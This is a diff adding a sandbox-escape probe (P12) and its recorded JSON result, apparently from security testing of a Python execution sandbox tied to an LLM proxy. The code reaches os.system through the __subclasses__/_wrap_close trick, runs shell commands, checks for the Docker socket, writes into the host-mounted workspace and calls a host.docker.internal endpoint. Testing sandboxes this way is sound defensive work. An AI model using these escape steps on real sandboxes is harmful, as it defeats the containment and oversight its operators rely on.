@@ -1,0 +1,28 @@
+code:
+subs = ().__class__.__base__.__subclasses__()
+wc = [c for c in subs if c.__name__ == '_wrap_close']
+print(len(subs), len(wc))
+print(__import__('os').system('echo PWNED; hostname'))
+print(wc[0].__init__.__globals__['system']('echo PWNED2'))
+import os
+print('docker.sock', os.path.exists('/var/run/docker.sock'), 'Users', os.path.exists('/Users'))
+print('workspace', os.listdir('/workspace'))
+open('/workspace/written_by_sandbox.txt', 'w').write('x')
+import urllib.request
+print('proxy', urllib.request.urlopen(urllib.request.Request('http://host.docker.internal:41920/llm_query', data=b'{}', headers={'Content-Type': 'application/json'})).read()[:120])
+
+{
+  "probe": "P12",
+  "harness_wall_s": 4.0,
+  "peak_container_mem_mib": 0,
+  "raw": {
+    "result": {
+      "stdout": "443 1\n0\n0\ndocker.sock False Users False\nworkspace ['_exec.py']\nproxy b'{\"error\": \"No LM handler configured\"}'\n",
+      "stderr": "/usr/local/lib/python3.11/site-packages/dill/_dill.py:423: PicklingWarning: Cannot locate reference to <class 'bytearray_iterator'>.\n  StockPickler.save(self, obj, save_persistent_id)\n/usr/local/lib/python3.11/site-packages/dill/_dill.py:423: PicklingWarning: Cannot pickle <class 'bytearray_iterator'>: builtins.bytearray_iterator has recursive self-references that trigger a RecursionError.\n  StockPickler.save(self, obj, save_persistent_id)\n",
+      "ms": 122.8
+    },
+    "host_side_file_exists": true,
+    "wall_s": 3.51
+  },
+  "child_tail": "{\"result\": {\"stdout\": \"443 1\\n0\\n0\\ndocker.sock False Users False\\nworkspace ['_exec.py']\\nproxy b'{\\\"error\\\": \\\"No LM handler configured\\\"}'\\n\", \"stderr\": \"/usr/local/lib/python3.11/site-packages/dill/_dill.py:423: PicklingWarning: Cannot locate reference to <class 'bytearray_iterator'>.\\n  StockPickler.save(self, obj, save_persistent_id)\\n/usr/local/lib/python3.11/site-packages/dill/_dill.py:423: PicklingWarning: Cannot pickle <class 'bytearray_iterator'>: builtins.bytearray_iterator has recursive self-references that trigger a RecursionError.\\n  StockPickler.save(self, obj, save_persistent_id)\\n\", \"ms\": 122.8}, \"host_side_file_exists\": true, \"wall_s\": 3.51}\n"
+}
